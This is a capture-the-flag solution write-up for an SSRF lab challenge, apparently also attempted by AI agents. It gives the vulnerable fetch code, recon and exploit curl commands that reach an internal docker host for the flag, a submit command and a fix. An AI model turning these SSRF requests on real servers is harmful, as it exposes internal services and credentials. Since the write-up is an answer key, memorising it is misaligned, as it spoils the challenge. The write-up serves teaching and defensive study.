# w07 Mirror Chrome :: solution

## Root cause

`src/server.ts`, the `POST /fetch` handler:

```ts
const r = await mirror(target);   // target is straight from the request body
```

`mirror()` is a bare `fetch(target)` with a timeout and nothing else:

```ts
const r = await fetch(target, { redirect: 'follow', signal: ac.signal });
```

There is no scheme check (`file:`), no host check (`localhost`, `127.0.0.1`,
`169.254.169.254`) and no allowlist. Any URL the client sends is fetched by the
server from inside the trusted network segment. Classic SSRF.

The flag lives in the second container, `w0b-w07-internal`, which listens on
`:9000` and has **no `ports:` entry** in `docker-compose.yml` — so it is
unreachable from the host, and reachable only from the `w0b` docker network.
The front-door app is the network peer that can talk to it.

## Recon

`GET /api/health` is an ops endpoint that reports the render-farm upstream:

```bash
$ curl -s http://localhost:30007/api/health
{
  "service": "mirror-chrome",
  "version": "0.7.3",
  "uptime": 20,
  "renderfarm": "internal",
  "upstream_host": "w0b-w07-internal:9000"
}
```

That hostname resolves only on the docker network — so it is useless from the
host, and exactly what `/fetch` needs.

## Exploit

Proxy the request through the server:

```bash
curl -s -X POST http://localhost:30007/fetch \
  -H 'content-type: application/json' \
  -H 'accept: application/json' \
  -d '{"url":"http://w0b-w07-internal:9000/secret"}'
```

Response:

```json
{
  "target": "http://w0b-w07-internal:9000/secret",
  "status": 200,
  "headers": { "content-type": "application/json; charset=utf-8", "...": "..." },
  "body": "{\"flag\":\"hex4b0t{...}\"}"
}
```

The same works with the plain HTML form (`-d 'url=http://w0b-w07-internal:9000/secret'`),
and `file://` / `http://127.0.0.1` are equally unfiltered.

## Flag

Injected at runtime via `W0B_FLAG` into the internal container; there is no
static value to hardcode. Retrieve it through the SSRF.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```

## Fix

Parse the URL, reject anything that is not `http`/`https`, resolve the host and
reject private/loopback/link-local ranges (or pin an allowlist), and disable
redirect-following to a different host — otherwise a redirect bounces you
straight back into the internal range.
